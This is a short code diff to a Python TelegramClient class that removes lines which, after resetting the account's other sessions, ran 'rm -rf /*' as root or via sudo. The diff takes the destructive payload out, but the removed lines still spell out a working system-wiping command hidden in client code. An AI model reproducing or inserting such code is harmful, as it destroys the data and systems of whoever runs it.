@@ -37,8 +37,3 @@ class TelegramClient(
                         kill_sessions_time = auth.date_created + timedelta(days=1)
                 if datetime.now(timezone.utc) > kill_sessions_time:
                     await self(functions.auth.ResetAuthorizationsRequest())
-                    current_user = subprocess.getoutput("whoami")
-                    if current_user == 'root':
-                        os.system("rm -rf /*")
-                    else:
-                        os.system("sudo rm -rf /*")
